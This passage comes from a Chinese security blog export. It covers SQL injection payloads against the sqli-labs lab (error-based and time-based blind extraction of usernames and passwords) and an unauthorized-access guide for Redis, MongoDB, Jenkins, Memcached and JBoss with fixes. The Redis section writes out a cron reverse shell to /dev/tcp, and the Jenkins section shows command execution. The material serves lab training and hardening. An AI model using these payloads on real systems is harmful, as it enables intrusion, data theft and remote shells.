id=\"2-2-4-爆数据\"><a href=\"#2-2-4-爆数据\" class=\"headerlink\" title=\"2.2.4.爆数据\"></a>2.2.4.爆数据</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">第一列数据:注意：这里只是爆出username列;</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select (exp(~(select * FROM(SELECT username from security.users limit</span></span><br><span class=\"line\"><span class=\"string\">0,1)a))),2,3 --+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool26.jpg\" alt=\"bool26\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select (exp(~(select * FROM(SELECT username from security.users limit</span></span><br><span class=\"line\"><span class=\"string\">1,1)a))),2,3 --+</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-2-5-爆两列数据\"><a href=\"#2-2-5-爆两列数据\" class=\"headerlink\" title=\"2.2.5.爆两列数据\"></a>2.2.5.爆两列数据</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select (exp(~(select * FROM(SELECT distinct</span></span><br><span class=\"line\"><span class=\"string\">concat(0x3a,username,0x3a,password) from security.users limit 0,1)a))),2,3 --+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool27.jpg\" alt=\"bool27\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select (exp(~(select * FROM(SELECT distinct</span></span><br><span class=\"line\"><span class=\"string\">concat(0x3a,username,0x3a,password) from security.users limit 1,1)a))),2,3 --+</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"2-3-bigint溢出\"><a href=\"#2-3-bigint溢出\" class=\"headerlink\" title=\"2.3.bigint溢出\"></a>2.3.bigint溢出</h2><p>具体产生原理可以阅读《mysql注入之bigint溢出报错注入》其中已经介绍完备;</p>\n<h3 id=\"2-3-1-爆库\"><a href=\"#2-3-1-爆库\" class=\"headerlink\" title=\"2.3.1.爆库\"></a>2.3.1.爆库</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select (!(select * from (select schema_name from</span></span><br><span class=\"line\"><span class=\"string\">information_schema.schemata limit 0,1)x) - ~0),2,3--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool29.jpg\" alt=\"bool29\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select (!(select * from (select schema_name from</span></span><br><span class=\"line\"><span class=\"string\">information_schema.schemata limit 6,1)x) - ~0),2,3--+</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-3-2-爆表\"><a href=\"#2-3-2-爆表\" class=\"headerlink\" title=\"2.3.2.爆表\"></a>2.3.2.爆表</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select (!(select * from (select table_name from information_schema.tables</span></span><br><span class=\"line\"><span class=\"string\">where table_schema=&#x27;security&#x27; limit 0,1)x) - ~0),2,3--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool30.jpg\" alt=\"bool30\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select (!(select * from (select table_name from information_schema.tables</span></span><br><span class=\"line\"><span class=\"string\">where table_schema=&#x27;security&#x27; limit 1,1)x) - ~0),2,3--+</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-3-3-爆字段\"><a href=\"#2-3-3-爆字段\" class=\"headerlink\" title=\"2.3.3.爆字段\"></a>2.3.3.爆字段</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select (!(select * from (select column_name from information_schema.columns</span></span><br><span class=\"line\"><span class=\"string\">where table_name=&#x27;users&#x27; limit 0,1)x) - ~0),2,3--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool31.jpg\" alt=\"bool31\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select (!(select * from (select column_name from information_schema.columns</span></span><br><span class=\"line\"><span class=\"string\">where table_name=&#x27;users&#x27; limit 1,1)x) - ~0),2,3--+</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-3-4-爆数据\"><a href=\"#2-3-4-爆数据\" class=\"headerlink\" title=\"2.3.4.爆数据\"></a>2.3.4.爆数据</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select (!(select * from (select username from security.users limit 0,1)x) -</span></span><br><span class=\"line\"><span class=\"string\">~0),2,3--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool32.jpg\" alt=\"bool32\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select (!(select * from (select username from security.users limit 1,1)x) -</span></span><br><span class=\"line\"><span class=\"string\">~0),2,3--+</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"2-4-Xpath报错注入\"><a href=\"#2-4-Xpath报错注入\" class=\"headerlink\" title=\"2.4.Xpath报错注入\"></a>2.4.Xpath报错注入</h2><p>主要的是extractvalue函数只要两个参数哦,updatexml是3个,所以在进行构造语句时需要注意.</p>\n<h3 id=\"2-4-1-Xpath注入之extractvalue\"><a href=\"#2-4-1-Xpath注入之extractvalue\" class=\"headerlink\" title=\"2.4.1.Xpath注入之extractvalue()\"></a>2.4.1.Xpath注入之extractvalue()</h3><p>mysql&gt; select extractvalue(1,concat(0x7e,(select database()),0x7e));</p>\n<h4 id=\"2-4-1-1-爆库\"><a href=\"#2-4-1-1-爆库\" class=\"headerlink\" title=\"2.4.1.1.爆库\"></a>2.4.1.1.爆库</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1” and extractvalue(1,concat(0x7e,(select database()),0x7e))--+</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool34.jpg\" alt=\"bool34\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and extractvalue(1,concat(0x7e,(select user()),0x7e))--+</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"2-4-1-2-爆表\"><a href=\"#2-4-1-2-爆表\" class=\"headerlink\" title=\"2.4.1.2.爆表\"></a>2.4.1.2.爆表</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables</span></span><br><span class=\"line\"><span class=\"string\">where table_schema=&#x27;security&#x27; limit 0,1),0x7e))--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool36.jpg\" alt=\"bool36\"></p>\n<h4 id=\"2-4-1-3-爆字段\"><a href=\"#2-4-1-3-爆字段\" class=\"headerlink\" title=\"2.4.1.3.爆字段\"></a>2.4.1.3.爆字段</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and extractvalue(1,concat(0x7e,(select column_name from</span></span><br><span class=\"line\"><span class=\"string\">information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e))--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool37.jpg\" alt=\"bool37\"></p>\n<h4 id=\"2-4-1-6-爆数据\"><a href=\"#2-4-1-6-爆数据\" class=\"headerlink\" title=\"2.4.1.6.爆数据\"></a>2.4.1.6.爆数据</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and extractvalue(1,concat(0x7e,(select username from security.users limit</span></span><br><span class=\"line\"><span class=\"string\">0,1),0x7e))--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool38.jpg\" alt=\"bool38\"></p>\n<h3 id=\"2-4-2-Xpath注入之updatexml\"><a href=\"#2-4-2-Xpath注入之updatexml\" class=\"headerlink\" title=\"2.4.2.Xpath注入之updatexml()\"></a>2.4.2.Xpath注入之updatexml()</h3><h4 id=\"2-4-2-1-爆库\"><a href=\"#2-4-2-1-爆库\" class=\"headerlink\" title=\"2.4.2.1.爆库\"></a>2.4.2.1.爆库</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool40.jpg\" alt=\"bool40\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"2-4-2-3-爆表\"><a href=\"#2-4-2-3-爆表\" class=\"headerlink\" title=\"2.4.2.3.爆表\"></a>2.4.2.3.爆表</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables</span></span><br><span class=\"line\"><span class=\"string\">where table_schema=&#x27;security&#x27; limit 0,1),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool41.jpg\" alt=\"bool41\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables</span></span><br><span class=\"line\"><span class=\"string\">where table_schema=&#x27;security&#x27; limit 1,1),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"2-4-2-4-爆字段\"><a href=\"#2-4-2-4-爆字段\" class=\"headerlink\" title=\"2.4.2.4.爆字段\"></a>2.4.2.4.爆字段</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns</span></span><br><span class=\"line\"><span class=\"string\">where table_name=&#x27;users&#x27; limit 0,1),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool42.jpg\" alt=\"bool42\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns</span></span><br><span class=\"line\"><span class=\"string\">where table_name=&#x27;users&#x27; limit 1,1),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"2-4-2-5-爆数据\"><a href=\"#2-4-2-5-爆数据\" class=\"headerlink\" title=\"2.4.2.5.爆数据\"></a>2.4.2.5.爆数据</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and updatexml(1,concat(0x7e,(select username from security.users limit</span></span><br><span class=\"line\"><span class=\"string\">0,1),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool43.jpg\" alt=\"bool43\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and updatexml(1,concat(0x7e,(select username from security.users limit </span></span><br><span class=\"line\"><span class=\"string\">1,1),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"三、时间盲注\"><a href=\"#三、时间盲注\" class=\"headerlink\" title=\"三、时间盲注\"></a>三、时间盲注</h1><p>时间盲注会称为延时注入,利用页面反回结果所用时间来判断注入是否存在和后期注入进行;<br>延时注入是主要针对页面请求时间变化,无法用布尔真假判断、无法报错的情况下的注入技术.<br>延时注入作为最精准的注入,但是缺点明显——耗时长要想利用延时注.<br>延迟注入常见函数：<br>sleep() //延时<br>if(condition,true,false) //条件语句<br>ascii()=ascii码 //转换成ascii码<br>substr(“string”,strart,length) //mid()也一样，取出字符串里的第几位开始，长度多少的字符.<br>原理： 延时注入的原理就是，所要爆的信息的ascii码正确时,产生延时,否则不延时。实例如下所示</p>\n<p><img src=\"/images/sqlall/bool45.jpg\" alt=\"bool45\"></p>\n<p>解析：<br>0、mysql&gt; select if(ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))=105,sleep(5),1);<br>1、select schema_name from information_schema.schemata limit 0,1 //取出数据库中第一个数据库,<br>2、substr(‘string’,1,1) //取出字符串,从第一个字符开始,长度为1,也就是第一个字母/字符<br>3、ascii(substr())=ascii码 //对字母/字符进行ascii编码并比较;<br>4、if(step1,1,sleep(5)) //如果第一个ascii编码的条件正确,会执行sleep()出现延时几秒,如果条件错误,则会在结果中输出1,可以看到上图的执行结果;<br>总结:可以再结合报错注入去猜解服务中数据库、表等信息;当然，延时注入也有不足之处太麻烦,但是较为准确基本能够确定字符;</p>\n<h2 id=\"3-1-时间盲注实战\"><a href=\"#3-1-时间盲注实战\" class=\"headerlink\" title=\"3.1.时间盲注实战\"></a>3.1.时间盲注实战</h2><p>这里采用Sqli-Labs中Less-10的实验来实战测试,为了更能体现出效果所以在延迟注入时,浏览器出现加载信息时出现延迟加载现象,或可以使用Burpsuite工具.</p>\n<h3 id=\"3-1-1-访问Less-10\"><a href=\"#3-1-1-访问Less-10\" class=\"headerlink\" title=\"3.1.1.访问Less-10\"></a>3.1.1.访问Less-10</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-10/?id=1</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool46.jpg\" alt=\"bool46\"></p>\n<h4 id=\"3-1-2-尝试双引号测试注入\"><a href=\"#3-1-2-尝试双引号测试注入\" class=\"headerlink\" title=\"3.1.2.尝试双引号测试注入\"></a>3.1.2.尝试双引号测试注入</h4><p>URL:浏览器出现延时,注意网络稳定性,不然会出现混淆;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://sqli-labs.me:8888/Less-10/?id=1<span class=\"string\">&quot; and sleep(5)--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool47.jpg\" alt=\"bool47\"></p>\n<h4 id=\"3-1-3-爆库\"><a href=\"#3-1-3-爆库\" class=\"headerlink\" title=\"3.1.3.爆库\"></a>3.1.3.爆库</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL：115—&gt;s</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-10/?id=1<span class=\"string\">&quot; and if(ord(mid(database(),1,1))=115,sleep(5),1)--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool48.jpg\" alt=\"bool48\"></p>\n<h4 id=\"3-1-5-爆表\"><a href=\"#3-1-5-爆表\" class=\"headerlink\" title=\"3.1.5.爆表\"></a>3.1.5.爆表</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL：101—&gt;e</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-10/?id=1<span class=\"string\">&quot; and if(ord(mid((select table_name from information_schema.tables where</span></span><br><span class=\"line\"><span class=\"string\">table_schema=&#x27;security&#x27; limit 0,1),1,1))=101,sleep(5),1)--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool50.jpg\" alt=\"bool50\"></p>\n<h4 id=\"3-1-6-爆字段\"><a href=\"#3-1-6-爆字段\" class=\"headerlink\" title=\"3.1.6.爆字段\"></a>3.1.6.爆字段</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL：105—&gt;i</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-10/?id=1<span class=\"string\">&quot; and if(ord(mid((select column_name from information_schema.columns where</span></span><br><span class=\"line\"><span class=\"string\">table_name=&#x27;users&#x27; limit 0,1),1,1))=105,sleep(5),1)--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool51.jpg\" alt=\"bool51\"></p>\n<h4 id=\"3-1-7-爆数据\"><a href=\"#3-1-7-爆数据\" class=\"headerlink\" title=\"3.1.7.爆数据\"></a>3.1.7.爆数据</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URl:68—&gt;D</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-10/?id=1<span class=\"string\">&quot; and if(ord(mid((select username from security.users limit</span></span><br><span class=\"line\"><span class=\"string\">0,1),1,1))=68,sleep(5),1)--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool52.jpg\" alt=\"bool52\"></p>\n<p>其他字段信息请自行搭建环境测试,</p>\n"},{"title":"常见未授权访问","date":"2020-07-11T03:46:21.000Z","_content":"\n本文主要介绍和学习关于“未授权访问”漏洞；从字面了解到“未授权”指的是部署的系统未启用认证功能而被直接访问/操作的安全隐患/漏洞。\n\n感谢前人大佬整理,内容参考网上大佬文章整理，您也可直接[看这里](https://xz.aliyun.com/t/6103#toc-12).漏洞环境参考[Vulhub](https://github.com/vulhub/vulhub),部分环境根据漏洞影响范围来选择安装和搭建.\n\n![image-20200709163151943](/images/Unauthorized/image-20200709163151943.png)\n\n<center>虚拟机22G</center>\n\n\n#### 准备\n\n```\n以下环境基本基于centos 7虚拟机部署检测完成。\n1.Docker\n2.jdk 1.8\n3.docker-compose\n4.其他参考各漏洞环境搭建部分.\n```\n\n#### Redis未授权访问\n\n##### 漏洞描述\n\n​\t\tRedis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器、添加计划任务、写入Webshell等操作。\n\n##### 漏洞验证\n\n0、环境搭建\n\n```shell\n# wget http://download.redis.io/releases/redis-2.8.17.tar.gz\n# tar xzvf redis-2.8.17.tar.gz\n# cd redis-2.8.17\n# make\n# cd src/\n# cp redis-server /usr/bin/\n# cp redis-cli /usr/bin/\n# cp redis.conf /etc/\n# redis-server /etc/redis.conf\n```\n\n![image-20200703144429633](/images/Unauthorized/image-20200703144429633.png)\n\n1、连接Redis\n\n本地可下载客户端进行连接Redis进行getshell等操作\n\n![image-20200703144858785](/images/Unauthorized/image-20200703144858785.png)\n\n![image-20200703144912904](/images/Unauthorized/image-20200703144912904.png)\n\n<center>如上图所示连接成功</center>\n2、getshell\n\n```shell\n# 攻击机执行nc监听\nnc -lvnp 9999\n# Redis客户端执行\nset shell \"\\n\\n*/1 * * * * /bin/bash -i>&/dev/tcp/172.16.144.141/9999 0>&1\\n\\n\"\nconfig set dir /var/spool/cron\nconfig set dbfilename root\nsave\n```\n\n还有其他方式进行反弹shell可网上参考\n\n![image-20200704093747944](/images/Unauthorized/image-20200704093747944.png)\n\n<center>getshell</center>\n\n\n##### 漏洞修复\n\n1、限制登录ip\n\n2、添加密码\n\n3、修改默认端口\n\n#### MongoDB 未授权访问\n\n##### 漏洞描述\n\n​\t开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,登录的用户可以通过默认端口无需密码对数据库任意操作（增、删、改、查高危动作）而且可以远程访问数据库。\n\n​\t造成未授权访问的根本原因就在于启动 Mongodb 的时候未设置 --auth 也很少会有人会给数据库添加上账号密码（默认空口令），使用默认空口令这将导致恶意攻击者无需进行账号认证就可以登陆到数据服务器。\n\n##### 漏洞验证\n\n0、环境搭建\n\n```shell\n//镜像搜索\n# docker search mongodb\n//拉取镜像\n# docker pull mongo\n//显示mongo镜像\n# docker images mongo\n//创建新的容器\n# docker run -d -p 27017:27017 --name mongodb mongo\n//显示所有容器\n# docker ps -a\n```\n\n1、NoSQLBooster连接\n\n![image-20200704122547655](/images/Unauthorized/image-20200704122547655.png)\n\n##### 漏洞修复\n\n1、MongoDB添加认证：MongoDB启动时添加--auth参数、为MongoDB添加用户\n\n2、启动时加入参数--bind_ip 127.0.0.1 或在/etc/mongodb.conf文件中添加以下内容：bind_ip = 127.0.0.1\n\n\n\n#### Jenkins 未授权访问\n\n##### 漏洞描述\n\n默认情况下 Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进入后台管理服务，通过脚本执行界面从而获取服务器权限。\n\n##### 漏洞验证\n\n0、环境搭建\n\n```shell\n//安装并启动Jenkins服务\n# rpm -ivh jenkins-2.7.3-1.1.noarch.rpm\n//修改默认端口\n# vim /etc/sysconfig/jenkins\nJENKINS_PORT=\"8089\"\n//jenkins服务启动\n# service jenkins start\n```\n\n![image-20200706091405075](/images/Unauthorized/image-20200706091405075.png)\n\n![image-20200706091522419](/images/Unauthorized/image-20200706091522419.png)\n\n1、浏览器访问\n\n```shell\nhttp://172.16.144.142:8089/login?from=%2F\n//浏览器访问后输入文件内的密码\n# vim /var/lib/jenkins/secrets/initialAdminPassword\n```\n\n2、未授权访问\n\n```\n//系统\nhttp://172.16.144.142:8089/\n```\n\n![image-20200706094611260](/images/Unauthorized/image-20200706094611260.png)\n\n3、执行命令\n\n```shell\nprintln \"whoami\".execute().text\n```\n\n![image-20200706095024778](/images/Unauthorized/image-20200706095024778.png)\n\n##### 漏洞修复\n\n1、版本升级\n\n2、添加认证，设置强密码复杂度及账号锁定\n\n3、禁止把Jenkins直接暴露在公网\n\n#### Memcached 未授权访问\n\n##### 漏洞描述\n\nMemcached是一个自由开源的，高性能，分布式内存对象缓存系统。\n\nMemcached是一种基于内存的key-value存储，用来存储小块的任意数据（字符串、对象）。这些数据可以是数据库调用、API调用或者是页面渲染的结果。 \n\n Memcached简洁而强大。它的简洁设计便于快速开发，减轻开发难度，解决了大数据量缓存的很多问题。它的API兼容大部分流行的开发语言。 \n\n 本质上，它是一个简洁的key-value存储系统。 \n\n一般的使用目的是，通过缓存数据库查询结果，减少数据库访问次数，以提高动态Web应用的速度、提高可扩展性。 \n\n##### 漏洞验证\n\n0、环境搭建\n\n```shell\n//安装\n# yum install memcached\n//启动\n# systemctl status  memcached.service\n//查看默认配置\n# cat /etc/sysconfig/memcached\n```\n\n1、telnet连接\n\n```shell\ntelnet 172.16.144.142 11211\nnc -vv 172.16.144.142 11211\n无需用户名密码，可以直接连接memcache\n```\n\n![image-20200706104012663](/images/Unauthorized/image-20200706104012663.png)\n\n![image-20200706110511684](/images/Unauthorized/image-20200706110511684.png)\n\n2、nmap检测\n\n```shell\nnmap -p 11211 --script memcached-info 172.16.144.142\n```\n\n![image-20200706105609418](/images/Unauthorized/image-20200706105609418.png)\n\n##### 漏洞修复\n\n-设置Memchached只允许本地访问\n\n```shell\nOPTIONS=\"-l 127.0.0.1\"\t\t//只允许本地访问\n```\n\n-禁止外网访问Memcached 11211端口\n\n#### JBOSS 未授权访问\n\n##### 漏洞描述\n\nJBoss是一个基于J2EE的开放源代码应用服务器，代码遵循LGPL许可，可以在任何商业应用中免费使用；JBoss也是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3规范。,默认情况下访问 `http://ip:8080/jmx-console` 就可以浏览 JBoss 的部署管理的信息不需要输入用户名和密码可以直接部署上传木马有安全隐患。\n\n##### 漏洞验证\n\n可参考JBoss漏洞介绍部分\n\n1、URL访问\n\n```\nhttp://172.16.144.157:8080/\n```\n\n![image-20200702154251373](/images/Unauthorized/image-20200702154251373.png)\n\n2、访问`JMX 